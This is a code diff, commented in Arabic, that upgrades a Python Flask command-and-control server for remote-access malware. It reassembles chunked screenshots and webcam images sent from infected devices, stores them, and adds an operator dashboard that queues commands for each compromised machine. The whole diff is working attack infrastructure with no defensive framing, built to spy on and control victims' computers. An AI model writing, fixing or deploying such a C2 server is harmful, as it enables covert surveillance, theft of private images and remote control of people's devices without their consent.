@@ -1,5 +1,5 @@
 # ============================================================
-# C2 Server v3.1 - Image Chunk Assembly
+# C2 Server v3.2 - Fixed Image Assembly
 # ============================================================
 
 import os
@@ -25,7 +25,6 @@ os.makedirs(SCREENSHOTS_DIR, exist_ok=True)
 
 ADMIN_PASSWORD = "changeme123"   # ← غيرها
 
-# تخزين مؤقت لأجزاء الصور
 IMAGE_CHUNKS = {}
 
 
@@ -74,7 +73,6 @@ def add_command(device_id, command_text):
 
 
 def save_result(device_id, command_id, output):
-    """حفظ النتيجة في السجل"""
     results = get_results()
     if device_id not in results:
         results[device_id] = []
@@ -85,6 +83,18 @@ def save_result(device_id, command_id, output):
     })
     results[device_id] = results[device_id][-200:]
     save_json(RESULTS_FILE, results)
+
+
+def safe_b64decode(data):
+    """فك Base64 مع إصلاح تلقائي للـ padding"""
+    data = data.strip().replace('\n', '').replace('\r', '').replace(' ', '')
+    missing = len(data) % 4
+    if missing == 1:
+        data = data[:-1]
+        missing = len(data) % 4
+    if missing:
+        data += '=' * (4 - missing)
+    return base64.b64decode(data)
 
 
 # ============================================================
@@ -162,14 +172,17 @@ def result():
     ]:
         if output.startswith(prefix):
             rest = output.replace(prefix, '')
-            # rest = "0:3:xxxxx"
             parts = rest.split(':', 2)
             
             if len(parts) != 3:
                 return jsonify({"error": "bad chunk format"}), 400
             
-            part_num = int(parts[0])
-            total_parts = int(parts[1])
+            try:
+                part_num = int(parts[0])
+                total_parts = int(parts[1])
+            except ValueError:
+                return jsonify({"error": "bad chunk numbers"}), 400
+            
             chunk_data = parts[2]
             
             # تخزين الجزء
@@ -185,34 +198,45 @@ def result():
             
             IMAGE_CHUNKS[device_id][command_id]["parts"][part_num] = chunk_data
             
+            received = len(IMAGE_CHUNKS[device_id][command_id]["parts"])
+            
             # إذا وصلت كل الأجزاء
-            if len(IMAGE_CHUNKS[device_id][command_id]["parts"]) == total_parts:
-                full_data = ""
+            if received == total_parts:
+                # ترتيب الأجزاء من 0 إلى total-1
+                parts_list = []
+                missing = []
                 for i in range(total_parts):
-                    full_data += IMAGE_CHUNKS[device_id][command_id]["parts"].get(i, "")
+                    if i in IMAGE_CHUNKS[device_id][command_id]["parts"]:
+                        parts_list.append(IMAGE_CHUNKS[device_id][command_id]["parts"][i])
+                    else:
+                        missing.append(i)
+                
+                if missing:
+                    final_output = f"[-] {img_type}: missing parts {missing}"
+                    save_result(device_id, command_id, final_output)
+                    del IMAGE_CHUNKS[device_id][command_id]
+                    return jsonify({"status": "incomplete", "missing": missing}), 200
+                
+                full_data = ''.join(parts_list)
                 
                 try:
-                    # إضافة padding إذا لزم
-                    missing_padding = len(full_data) % 4
-                    if missing_padding:
-                        full_data += '=' * (4 - missing_padding)
-                    
-                    img_bytes = base64.b64decode(full_data)
-                    
+                    img_bytes = safe_b64decode(full_data)
                     img_path = os.path.join(SCREENSHOTS_DIR, f"{device_id}_{img_type}.{ext}")
                     with open(img_path, 'wb') as f:
                         f.write(img_bytes)
-                    
                     final_output = f"[+] {img_type.capitalize()} saved ({len(img_bytes)} bytes, {total_parts} parts)"
                 except Exception as e:
-                    final_output = f"[-] {img_type} decode error: {e}"
+                    final_output = f"[-] {img_type} decode error: {e} | len={len(full_data)}"
                 
-                # حذف الأجزاء المؤقتة
                 del IMAGE_CHUNKS[device_id][command_id]
-                
                 save_result(device_id, command_id, final_output)
             
-            return jsonify({"status": "ok", "part": part_num}), 200
+            return jsonify({
+                "status": "ok",
+                "part": part_num,
+                "received": received,
+                "total": total_parts
+            }), 200
     
     # ========================================================
     # الصور الصغيرة (بدون تقسيم)
@@ -220,10 +244,7 @@ def result():
     if output.startswith('SCREENSHOT:'):
         img_data = output.replace('SCREENSHOT:', '')
         try:
-            missing_padding = len(img_data) % 4
-            if missing_padding:
-                img_data += '=' * (4 - missing_padding)
-            img_bytes = base64.b64decode(img_data)
+            img_bytes = safe_b64decode(img_data)
             img_path = os.path.join(SCREENSHOTS_DIR, f"{device_id}_screen.png")
             with open(img_path, 'wb') as f:
                 f.write(img_bytes)
@@ -234,10 +255,7 @@ def result():
     elif output.startswith('WEBCAM:'):
         img_data = output.replace('WEBCAM:', '')
         try:
-            missing_padding = len(img_data) % 4
-            if missing_padding:
-                img_data += '=' * (4 - missing_padding)
-            img_bytes = base64.b64decode(img_data)
+            img_bytes = safe_b64decode(img_data)
             img_path = os.path.join(SCREENSHOTS_DIR, f"{device_id}_webcam.jpg")
             with open(img_path, 'wb') as f:
                 f.write(img_bytes)
@@ -245,9 +263,7 @@ def result():
         except Exception as e:
             output = f"[-] Webcam save error: {e}"
     
-    # حفظ النتيجة
     save_result(device_id, command_id, output)
-    
     return jsonify({"status": "ok"}), 200
 
 
@@ -567,4 +583,84 @@ def index():
 
 @app.route('/login', methods=['GET', 'POST'])
 def login():
-    error =
+    error = None
+    if request.method == 'POST':
+        if request.form.get('password') == ADMIN_PASSWORD:
+            session['logged_in'] = True
+            return redirect('/dashboard')
+        error = "كلمة المرور خطأ"
+    return render_template_string(LOGIN_TEMPLATE, error=error)
+
+
+@app.route('/logout')
+def logout():
+    session.pop('logged_in', None)
+    return redirect('/login')
+
+
+@app.route('/dashboard', methods=['GET', 'POST'])
+def dashboard():
+    if not session.get('logged_in'):
+        return redirect('/login')
+    
+    devices = get_devices()
+    commands = get_commands()
+    results_data = get_results()
+    
+    images_count = 0
+    if os.path.exists(SCREENSHOTS_DIR):
+        images_count = len([f for f in os.listdir(SCREENSHOTS_DIR) 
+                            if f.endswith('.png') or f.endswith('.jpg')])
+    
+    now = datetime.now()
+    online_count = 0
+    for d_id, info in devices.items():
+        try:
+            last = datetime.fromisoformat(info['last_seen'])
+            if (now - last).total_seconds() < 60:
+                info['online'] = True
+                online_count += 1
+            else:
+                info['online'] = False
+        except:
+            info['online'] = False
+    
+    total_commands = sum(len(cmds) for cmds in commands.values())
+    
+    selected_id = request.args.get('device') or request.form.get('device_id')
+    selected = None
+    device_results = []
+    
+    if request.method == 'POST' and selected_id:
+        command_text = request.form.get('command', '').strip()
+        if command_text:
+            add_command(selected_id, command_text)
+            return redirect(f'/dashboard?device={selected_id}')
+    
+    if selected_id and selected_id in devices:
+        selected = devices[selected_id]
+        device_results = results_data.get(selected_id, [])
+        device_results = list(reversed(device_results[-30:]))
+    
+    return render_template_string(
+        DASHBOARD_TEMPLATE,
+        devices=devices,
+        total=len(devices),
+        online=online_count,
+        commands_count=total_commands,
+        images_count=images_count,
+        selected=selected,
+        device_id=selected_id,
+        results=device_results,
+        timestamp=int(datetime.now().timestamp())
+    )
+
+
+@app.route('/health')
+def health():
+    return "OK", 200
+
+
+if __name__ == '__main__':
+    port = int(os.environ.get('PORT', 5000))
+    app.run(host='0.0.0.0', port=port)
